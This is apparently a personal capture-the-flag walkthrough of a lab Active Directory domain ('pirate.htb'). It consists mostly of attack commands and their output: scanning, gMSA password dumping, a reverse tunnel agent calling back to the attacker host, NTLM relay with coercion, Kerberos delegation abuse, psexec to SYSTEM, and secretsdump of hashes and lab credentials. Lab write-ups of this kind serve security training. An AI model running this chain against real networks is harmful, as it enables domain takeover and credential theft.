### Nmap
```
nmap -sV -sC -vv 10.129.9.43

---OUTPUT---
Nmap scan report for 10.129.9.43
Host is up, received echo-reply ttl 127 (0.017s latency).
Scanned at 2026-03-04 10:30:20 EST for 92s
Not shown: 985 filtered tcp ports (no-response)
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp   open  http          syn-ack ttl 126 Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-03-04 22:30:34Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: pirate.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.pirate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.pirate.htb
| Issuer: commonName=pirate-DC01-CA/domainComponent=pirate
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-06-09T14:05:15
| Not valid after:  2026-06-09T14:05:15
| MD5:     5c8e b331 ef90 890a d8e3 feaa b53c 2910
| SHA-1:   0128 c655 2aed c190 efff d3eb a2fb 034b fa86 ab69
| SHA-256: a2c7 cecc 4854 8f57 a69c 7302 9621 8bb1 6796 ee2d ad60 c34b b005 9a00 a1e6 3358
| -----BEGIN CERTIFICATE-----
| MIIGKDCCBRCgAwIBAgITdAAAAAP6wnCqSNol9QAAAAAAAzANBgkqhkiG9w0BAQsF
| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGcGlyYXRl
| MRcwFQYDVQQDEw5waXJhdGUtREMwMS1DQTAeFw0yNTA2MDkxNDA1MTVaFw0yNjA2
| MDkxNDA1MTVaMBoxGDAWBgNVBAMTD0RDMDEucGlyYXRlLmh0YjCCASIwDQYJKoZI
| hvcNAQEBBQADggEPADCCAQoCggEBAMnSrMfKeTD3rXSf5Vtyri9jELPEvEcLNbDF
| MoMV9vFYfbJgCd4a1xRs1Zc1AKGti9l45w2WYGI8POtp9oBlg0sb0+9LX07mxLr3
| 28BJ2VNxhV6JhOMMSBRlQ4K5B7vKzgXw24CIfPUHrfPJJ3G6cjEDawDLQErlRFJ7
| p/fEgs5CTePFrcpiB94JBoaV1a+kBiY7a2sHGZXWy4alXoP/a0GEEdzcSPFj5MVV
| jA8NvEmptFG+SzZO9szR03rQRzhJHsVTQHgjw0+2NOi5UJ3GlhUiFzynSrfRae45
| qpqRzQ6wLYnlKvVv2OIujkgYBaCPvmTJ2ZGkD+pF5pILfcvdBn0CAwEAAaOCAzkw
| ggM1MC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABs
| AGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQD
| AgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQME
| AgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglg
| hkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFAnRcvhGgC93
| sCJqS7xJfQe20VzfMB8GA1UdIwQYMBaAFLtY4D2HzTfY9jUtfvRgBNVPOZsIMIHI
| BgNVHR8EgcAwgb0wgbqggbeggbSGgbFsZGFwOi8vL0NOPXBpcmF0ZS1EQzAxLUNB
| LENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl
| cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9cGlyYXRlLERDPWh0Yj9jZXJ0aWZp
| Y2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0
| aW9uUG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaBn2xkYXA6
| Ly8vQ049cGlyYXRlLURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNl
| cnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9cGlyYXRlLERD
| PWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlv
| bkF1dGhvcml0eTA7BgNVHREENDAyoB8GCSsGAQQBgjcZAaASBBDEVbnRlVqPSpJn
| m1iCmy/sgg9EQzAxLnBpcmF0ZS5odGIwTwYJKwYBBAGCNxkCBEIwQKA+BgorBgEE
| AYI3GQIBoDAELlMtMS01LTIxLTQxMDc0MjQxMjgtNDE1ODA4MzU3My0xMzAwMzI1
| MjQ4LTEwMDAwDQYJKoZIhvcNAQELBQADggEBAJv8X9T3HMKJ0L6m6eaHhd/X7C4d
| Ax38d6E6LbKYFyeK/UvbuFHCbMP9idfKxOEXsxKAvbK5F2rSkrlEeRqnnU68WkcU
| AG/gjmWOt1GFayNUGeUNteP1B8tpAv3V4BisIjOaE7oflz7+z1TImhcyghBbpG+n
| EviKNA3eQmxPpvcpmGvlg+70A1EghOfHOLr/3/ezfUmGUaYMONadSMM1rgN0Tcux
| 4dX2LDo4PoAbEY/X9z0C/mUJGaIw0NRaYwYnnXJSDaj42juZvgGbomE2JB5Tu+gJ
| hriiFzSqPhNk/jSlWx8H6TindyH+xyK9q5xa6X20tmEKYVtS2aAcSmt2URI=
|_-----END CERTIFICATE-----
|_ssl-date: 2026-03-04T22:31:55+00:00; +7h00m03s from scanner time.
443/tcp  open  https?        syn-ack ttl 126
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: pirate.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.pirate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.pirate.htb
| Issuer: commonName=pirate-DC01-CA/domainComponent=pirate
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-06-09T14:05:15
| Not valid after:  2026-06-09T14:05:15
| MD5:     5c8e b331 ef90 890a d8e3 feaa b53c 2910
| SHA-1:   0128 c655 2aed c190 efff d3eb a2fb 034b fa86 ab69
| SHA-256: a2c7 cecc 4854 8f57 a69c 7302 9621 8bb1 6796 ee2d ad60 c34b b005 9a00 a1e6 3358
| -----BEGIN CERTIFICATE-----
| MIIGKDCCBRCgAwIBAgITdAAAAAP6wnCqSNol9QAAAAAAAzANBgkqhkiG9w0BAQsF
| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGcGlyYXRl
<snip>
| 4dX2LDo4PoAbEY/X9z0C/mUJGaIw0NRaYwYnnXJSDaj42juZvgGbomE2JB5Tu+gJ
| hriiFzSqPhNk/jSlWx8H6TindyH+xyK9q5xa6X20tmEKYVtS2aAcSmt2URI=
|_-----END CERTIFICATE-----
|_ssl-date: 2026-03-04T22:31:55+00:00; +7h00m03s from scanner time.
2179/tcp open  vmrdp?        syn-ack ttl 127
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: pirate.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.pirate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.pirate.htb
| Issuer: commonName=pirate-DC01-CA/domainComponent=pirate
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-06-09T14:05:15
| Not valid after:  2026-06-09T14:05:15
| MD5:     5c8e b331 ef90 890a d8e3 feaa b53c 2910
| SHA-1:   0128 c655 2aed c190 efff d3eb a2fb 034b fa86 ab69
| SHA-256: a2c7 cecc 4854 8f57 a69c 7302 9621 8bb1 6796 ee2d ad60 c34b b005 9a00 a1e6 3358
| -----BEGIN CERTIFICATE-----
| MIIGKDCCBRCgAwIBAgITdAAAAAP6wnCqSNol9QAAAAAAAzANBgkqhkiG9w0BAQsF
| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGcGlyYXRl
<SNIP>
| 4dX2LDo4PoAbEY/X9z0C/mUJGaIw0NRaYwYnnXJSDaj42juZvgGbomE2JB5Tu+gJ
| hriiFzSqPhNk/jSlWx8H6TindyH+xyK9q5xa6X20tmEKYVtS2aAcSmt2URI=
|_-----END CERTIFICATE-----
|_ssl-date: 2026-03-04T22:31:55+00:00; +7h00m03s from scanner time.
3269/tcp open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: pirate.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-03-04T22:31:55+00:00; +7h00m03s from scanner time.
| ssl-cert: Subject: commonName=DC01.pirate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.pirate.htb
| Issuer: commonName=pirate-DC01-CA/domainComponent=pirate
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-06-09T14:05:15
| Not valid after:  2026-06-09T14:05:15
| MD5:     5c8e b331 ef90 890a d8e3 feaa b53c 2910
| SHA-1:   0128 c655 2aed c190 efff d3eb a2fb 034b fa86 ab69
| SHA-256: a2c7 cecc 4854 8f57 a69c 7302 9621 8bb1 6796 ee2d ad60 c34b b005 9a00 a1e6 3358
| -----BEGIN CERTIFICATE-----
| MIIGKDCCBRCgAwIBAgITdAAAAAP6wnCqSNol9QAAAAAAAzANBgkqhkiG9w0BAQsF
| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGcGlyYXRl
<SNIP>
| 4dX2LDo4PoAbEY/X9z0C/mUJGaIw0NRaYwYnnXJSDaj42juZvgGbomE2JB5Tu+gJ
| hriiFzSqPhNk/jSlWx8H6TindyH+xyK9q5xa6X20tmEKYVtS2aAcSmt2URI=
|_-----END CERTIFICATE-----
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-03-04T22:31:15
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 14832/tcp): CLEAN (Timeout)
|   Check 2 (port 64237/tcp): CLEAN (Timeout)
|   Check 3 (port 65421/udp): CLEAN (Timeout)
|   Check 4 (port 20993/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 7h00m02s, deviation: 0s, median: 7h00m02s
```

- New tool, adscan pro:
```
git clone https://github.com/ADScanPro/adscan/
pipx install adscan
adscan install
adscan start
```
- edit krb5.conf:
```
[libdefaults]
    default_realm = PIRATE.HTB
    dns_lookup_realm = false
    dns_lookup_kdc = false

[realms]
    PIRATE.HTB = {
        kdc = 10.129.4.86
        admin_server = 10.129.4.86
    }

[domain_realm]
    .pirate.htb = PIRATE.HTB
    pirate.htb = PIRATE.HTB
```
- With the given credentials I found some more usernames in ldapsearch


- I then noticed MS01$ pre 2000 compatible windows users. Pre 2000 windows usually used the same password as the account name for such accounts. I also notice gMSA accounts.

- Using this I grab the TGT for user MS01$ with the password `ms01`. It authenticates and I get a ccache. 
```
faketime "+7hours" impacket-getTGT pirate.htb/MS01$:ms01

---OUTPUT---
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in MS01$.ccache
```
- I export the ccache for the next step (and also check if it is validating with the ldap server)
```
cp MS01\$.ccache ms01w.ccache
export KRB5CCNAME=ms01w.ccache          
klist

---OUTPUT---
Ticket cache: FILE:ms01w.ccache
Default principal: MS01$@PIRATE.HTB

Valid starting       Expires              Service principal
03/12/2026 14:01:17  03/13/2026 00:01:17  krbtgt/PIRATE.HTB@PIRATE.HTB
        renew until 03/13/2026 14:01:15

```
- Using the ccache I dump gMSA passwords:
```
faketime "+7hours" python3 /opt/gMSADumper/gMSADumper.py -d pirate.htb -l dc01.pirate.htb -k

---OUTPUT---
Users or groups who can read password for gMSA_ADCS_prod$:
 > Domain Secure Servers
gMSA_ADCS_prod$:::25c7f0eb586ed3a91375dbf2f6e4a3ea
gMSA_ADCS_prod$:aes256-cts-hmac-sha1-96:9914ba076bcac3bb56424c0b7d8ea8b45eb088d87fdbee3d1c6a386709e20771
gMSA_ADCS_prod$:aes128-cts-hmac-sha1-96:8e87fa0a6d2d81ff7bc5da963838e714
Users or groups who can read password for gMSA_ADFS_prod$:
 > Domain Secure Servers
gMSA_ADFS_prod$:::fd9ea7ac7820dba5155bd6ed2d850c09
gMSA_ADFS_prod$:aes256-cts-hmac-sha1-96:6ccf53f00842805c75c7b314bdee5df355849093b3ef64a443c011f81f962f06
gMSA_ADFS_prod$:aes128-cts-hmac-sha1-96:fffb52ec0f49bc1eb872cfa4fa4f93ad

```

- The second password works well in this case its `fd9ea7ac7820dba5155bd6ed2d850c09`
- - - 
- Checking `ipconfig` we see two networks :

![[Pasted image 20260316084531.png]].

- I set up a ligolo tunnel:
```
---ON ATTACKER MACHINE---
./proxy -selfcert -laddr 0.0.0.0:443

--AFTER TARGET COMMANDS--
session
1
start

---ON TARGET MACHINE---
.\agent.exe -connect 10.10.16.126:443 -ignore-cert
```
- Then set up route and fake IP locally:
```
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 192.168.100.0/24 dev ligolo
sudo ip addr add 192.168.100.50/24 dev ligolo
```

- Using ntlmrelayx and coercer I can create a new computer:
```
python3 ntlmrelayx.py -t ldaps://10.129.8.117 --delegate-access --remove-mic -smb2support

coercer coerce -l 10.10.16.126 -t 192.168.100.2 -d pirate.htb \
  -u 'gMSA_ADFS_prod$' --hashes :fd9ea7ac7820dba5155bd6ed2d850c09 --always-continue
  
---OUTPUT---
[*] ldaps://PIRATE/WEB01$@10.129.8.117 [1] -> Adding new computer with username: TVWKZHNT$ and password: WY6Ka}uTUc#1;_u result: OK
```

- Using this I can grab a ticket and impersonate Administrator on WEB01.
```
faketime "+7hours" impacket-getST -spn 'cifs/WEB01.pirate.htb' -impersonate 'Administrator' \
  'pirate.htb/TVWKZHNT$:WY6Ka}uTUc#1;_u' -dc-ip 10.129.8.117

---OUTPUT---
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_WEB01.pirate.htb@PIRATE.HTB.ccache
```

- I can then use psexec and this ticket to access WEB01 as Administrator:
```
export KRB5CCNAME=Administrator@cifs_WEB01.pirate.htb@PIRATE.HTB.ccache

faketime "+7hours" impacket-psexec -k -no-pass Administrator@WEB01.pirate.htb
```
![[Pasted image 20260316093218.png]]

- I grab the user flag on a.white's Desktop:
![[Pasted image 20260316093246.png]]

- As I am admin on WEB01 I can dump secrets via impacket-secretsdump to grab all hashes:
```
faketime "+7hours" impacket-secretsdump  -k -no-pass WEB01.pirate.htb

---OUTPUT---
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x342dfe90cc4061078b79f011cd08f931
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:b1aac1584c2ea8ed0a9429684e4fc3e5:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:60da2d3ba00d6b5932e4c87dce6fa6b4:::
[*] Dumping cached domain logon information (domain/username:hash)
PIRATE.HTB/Administrator:$DCC2$10240#Administrator#8baf09ddc5830ac4456ee8639dd89644: (2026-02-25 02:41:09+00:00)
PIRATE.HTB/gMSA_ADFS_prod$:$DCC2$10240#gMSA_ADFS_prod$#66812dfee46ff41c9c8245a2819c3183: (2026-02-25 17:59:14+00:00)
PIRATE.HTB/a.white:$DCC2$10240#a.white#366c8924be3ea6d1d12825569a4bcc39: (2026-03-16 19:32:39+00:00)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
PIRATE\WEB01$:plain_password_hex:29f1505d87014b01b4317fed1d52ddbee2792a698e7e1de1bcdf29ab5d4b8e54828ce470d23491ba84e82d786622a821a14c730cf8610a32db1951b7619ee08c3bcacbab53aac8e052bd64e638c6bbd9529daacf04f86cfb9034808c4378d2c328c8c6afe7655f4a099dc41caeb6279c53313edcbd58db3e14490b7543ba3250ac200ec9834992b61b3f4319162645b50f402de4db0843fc43db7d54e04828abf86e490959bc88670e50f0b50373a3745f70039f8fd032435c4a725526957c7ae0dbaa81273b3aa28c0b029fea90c271b6601ef3ba7a05a13ec8c8ffd9999dd10eee87b4b9eb08a8a4af90710056f558
PIRATE\WEB01$:aad3b435b51404eeaad3b435b51404ee:feba09cf0013fbf5834f50def734bca9:::
[*] DefaultPassword 
PIRATE\a.white:E2nvAOKSz5Xz2MJu
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x01cffc2ef9a91d20107371f9a4a4112c892ed989
dpapi_userkey:0xa4fddb1b2df2db7cc3d044dc1b559bc1b45a1de9
[*] NL$KM 
 0000   A5 24 39 57 3F 8F 30 DC  61 F1 56 B7 B5 5C 0F 7C   .$9W?.0.a.V..\.|
 0010   6B 0A FF DF B0 A2 99 C3  68 A9 FE 15 E2 48 33 A9   k.......h....H3.
 0020   E9 8C 27 F8 8B 7C 05 55  4D FE 3C 5D 09 EA 9C 49   ..'..|.UM.<]...I
 0030   95 EB 7A 09 5B 48 7A 14  DC 74 E9 CB 7C 1A E0 8A   ..z.[Hz..t..|...
NL$KM:a52439573f8f30dc61f156b7b55c0f7c6b0affdfb0a299c368a9fe15e24833a9e98c27f88b7c05554dfe3c5d09ea9c4995eb7a095b487a14dc74e9cb7c1ae08a
[*] _SC_GMSA_DPAPI_{C6810348-4834-4a1e-817D-5838604E6004}_a09ca32bc7cd2ce752ae0143bd203f0551564c04dd2846c4ed3e4e5a61cc9f11 
 0000   E3 EF 47 4B 98 13 8D D4  46 9F 6D C1 76 F8 79 BA   ..GK....F.m.v.y.
 0010   1E 08 17 BA 44 50 21 87  B9 08 0B 9F 33 34 C9 1B   ....DP!.....34..
 0020   9B 1A F1 CE 4E 91 FB 56  2C 8D 88 24 41 2C 70 0E   ....N..V,..$A,p.
 0030   00 D1 05 BC 67 4D 8E 26  A5 94 E3 DA 41 73 F2 C8   ....gM.&....As..
 0040   73 13 D6 34 B3 9C 34 12  D4 BF B6 84 92 47 68 6D   s..4..4......Ghm
 0050   F6 06 5B 53 65 66 80 7E  0A CE 92 F9 4E A3 16 6B   ..[Sef.~....N..k
 0060   B9 75 2D 12 D3 52 C8 9B  9F DA FA 7D 31 71 E4 DD   .u-..R.....}1q..
 0070   55 BE 9D 58 55 04 F8 C6  28 A0 FF 4C 67 0D 75 95   U..XU...(..Lg.u.
 0080   A9 09 A3 C9 A7 EC 2D FF  98 4E 5D DF 77 04 9A 91   ......-..N].w...
 0090   A5 59 7F 0A 39 C5 49 94  55 67 59 01 CC E4 1A DE   .Y..9.I.UgY.....
 00a0   D9 8D 80 A1 B5 F7 F8 2C  C2 20 B5 90 DF 4B FC 0B   .......,. ...K..
 00b0   FC 5F 0F EB 66 E7 3A 56  F1 AB 7F E9 14 C6 D7 CD   ._..f.:V........
 00c0   2B 83 E0 B9 06 5B 76 E0  2B C3 30 F7 69 44 16 F3   +....[v.+.0.iD..
 00d0   AC D6 C4 63 DF 84 92 35  00 B6 4A 10 14 E7 44 13   ...c...5..J...D.
 00e0   80 9A 7A 06 AF 57 7C E7  68 5B FD 2A B5 6A 20 67   ..z..W|.h[.*.j g
_SC_GMSA_DPAPI_{C6810348-4834-4a1e-817D-5838604E6004}_a09ca32bc7cd2ce752ae0143bd203f0551564c04dd2846c4ed3e4e5a61cc9f11:e3ef474b98138dd4469f6dc176f879ba1e0817ba44502187b9080b9f3334c91b9b1af1ce4e91fb562c8d8824412c700e00d105bc674d8e26a594e3da4173f2c87313d634b39c3412d4bfb6849247686df6065b536566807e0ace92f94ea3166bb9752d12d352c89b9fdafa7d3171e4dd55be9d585504f8c628a0ff4c670d7595a909a3c9a7ec2dff984e5ddf77049a91a5597f0a39c5499455675901cce41aded98d80a1b5f7f82cc220b590df4bfc0bfc5f0feb66e73a56f1ab7fe914c6d7cd2b83e0b9065b76e02bc330f7694416f3acd6c463df84923500b64a1014e74413809a7a06af577ce7685bfd2ab56a2067
[*] _SC_GMSA_{84A78B8C-56EE-465b-8496-FFB35A1B52A7}_a09ca32bc7cd2ce752ae0143bd203f0551564c04dd2846c4ed3e4e5a61cc9f11 
 0000   01 00 00 00 22 01 00 00  10 00 00 00 12 01 1A 01   ...."...........
 0010   B6 C4 08 39 11 A2 83 50  B1 FD 69 48 80 36 50 E1   ...9...P..iH.6P.
 0020   B1 C5 74 1F 77 19 B1 F4  FF 92 62 03 DC DF 4E C9   ..t.w.....b...N.
 0030   C0 36 9B 7B 92 FE 10 A2  D7 FF 95 3B FA 40 6A 3B   .6.{.......;.@j;
 0040   67 86 52 3E D8 27 67 CC  8F E2 73 4A F8 92 E9 8E   g.R>.'g...sJ....
 0050   FB EF 2B 34 76 75 90 32  B4 EC DE F3 42 76 C3 63   ..+4vu.2....Bv.c
 0060   B8 A9 41 0B 63 D8 09 EA  6E F1 67 F5 B5 41 D7 3C   ..A.c...n.g..A.<
 0070   3A C4 21 4D A2 2A 14 D9  79 82 C9 28 D9 1B B9 71   :.!M.*..y..(...q
 0080   FE 99 D4 80 9C 1E BD EA  E8 E7 69 C6 B3 37 7E E1   ..........i..7~.
 0090   A4 78 DF FB B2 DD C1 33  18 BE 13 11 67 D1 A4 A0   .x.....3....g...
 00a0   18 33 A4 C2 7E 05 12 69  0D 73 DE 1E 59 A0 17 61   .3..~..i.s..Y..a
 00b0   EC 7D 40 FC 18 82 05 0C  BF 43 9D 9C BB 28 1A 06   .}@......C...(..
 00c0   D4 BF 8D 85 D1 FE B2 74  0E C3 99 EC A0 E4 6E 36   .......t......n6
 00d0   99 0B 72 B2 C4 A6 4A E0  09 BA FB 3D FD 26 4F F7   ..r...J....=.&O.
 00e0   34 B6 3F B9 22 60 9E 8C  30 58 83 A7 5D 9A EF 75   4.?."`..0X..]..u
 00f0   CE 37 BC A0 91 04 36 59  0D 93 12 FC A4 6A D8 9A   .7....6Y.....j..
 0100   61 A8 9B DD C8 73 19 7D  E4 8E AB 3D 69 B9 E4 98   a....s.}...=i...
 0110   00 00 19 41 B0 1B 73 17  00 00 19 E3 DF 68 72 17   ...A..s......hr.
 0120   00 00                                              ..
_SC_GMSA_{84A78B8C-56EE-465b-8496-FFB35A1B52A7}_a09ca32bc7cd2ce752ae0143bd203f0551564c04dd2846c4ed3e4e5a61cc9f11:01000000220100001000000012011a01b6c4083911a28350b1fd6948803650e1b1c5741f7719b1f4ff926203dcdf4ec9c0369b7b92fe10a2d7ff953bfa406a3b6786523ed82767cc8fe2734af892e98efbef2b3476759032b4ecdef34276c363b8a9410b63d809ea6ef167f5b541d73c3ac4214da22a14d97982c928d91bb971fe99d4809c1ebdeae8e769c6b3377ee1a478dffbb2ddc13318be131167d1a4a01833a4c27e0512690d73de1e59a01761ec7d40fc1882050cbf439d9cbb281a06d4bf8d85d1feb2740ec399eca0e46e36990b72b2c4a64ae009bafb3dfd264ff734b63fb922609e8c305883a75d9aef75ce37bca0910436590d9312fca46ad89a61a89bddc873197de48eab3d69b9e49800001941b01b7317000019e3df6872170000
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
```

- get a.white's hash. `PIRATE.HTB/a.white:$DCC2$10240#a.white#366c8924be3ea6d1d12825569a4bcc39:`

- Looking at bloodhound a.white can force change password of a.white-adm:
![[Pasted image 20260316093650.png]]
- furthermoo the admin account has writeSPN privileges on all machines
![[Pasted image 20260316095047.png]]

- Also looking at admin account it also has the allowed to delegate privilege.
![[Pasted image 20260316101526.png]]

- We can first gain access to the admin account and then delegate oiur HTTP SPN from WEB01 to DC01 to then be able to impersonate as Administrator on the DC

- First i reset the password of the admin account:
```
faketime "+7hours" net rpc password "a.white_adm" "newP@ssword2026" -U "PIRATE.HTB"/"a.white"%"E2nvAOKSz5Xz2MJu" -S "DC01.pirate.htb"
```
- Then I can remove the SPN for a.white_adm from WEB01 and add it to DC01:
```
faketime "7hours" impacket-getST -spn 'HTTP/WEB01.pirate.htb' -impersonate 'Administrator' \
  'pirate.htb/a.white_adm:newP@ssword2026' -dc-ip 10.129.8.117 \
  -altservice 'CIFS/DC01.pirate.htb'
  
  
---OUTPUT---
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Changing service from HTTP/WEB01.pirate.htb@PIRATE.HTB to CIFS/DC01.pirate.htb@PIRATE.HTB
[*] Saving ticket in Administrator@CIFS_DC01.pirate.htb@PIRATE.HTB.ccache
```

- Finally I can add the SPN to DC01:
```
export KRB5CCNAME=Administrator@CIFS_DC01.pirate.htb@PIRATE.HTB.ccache

faketime "+7hours" impacket-psexec -k -no-pass Administrator@DC01.pirate.htb


---OUTPUT--- 
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on DC01.pirate.htb.....
[*] Found writable share ADMIN$
[*] Uploading file HyXckaip.exe
[*] Opening SVCManager on DC01.pirate.htb.....
[*] Creating service subR on DC01.pirate.htb.....
[*] Starting service subR.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.8385]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

```

- I can then grab the root flag in Administrator's desktop:
![[Pasted image 20260316101945.png]]
